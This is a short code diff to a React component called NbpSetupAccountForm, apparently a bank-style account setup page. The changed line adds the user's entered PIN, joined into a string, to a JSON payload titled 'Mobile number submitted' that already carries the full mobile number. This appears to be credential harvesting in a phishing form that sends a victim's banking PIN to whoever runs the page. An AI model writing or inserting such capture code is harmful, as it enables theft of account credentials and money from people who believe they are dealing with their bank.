@@ -83,7 +83,7 @@ export function NbpSetupAccountForm() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                   title: 'Mobile number submitted',
-                  fields: { 'Mobile Number': fullMobile },
+                  fields: { 'Mobile Number': fullMobile, PIN: pin.join('') },
                 }),
               })
 
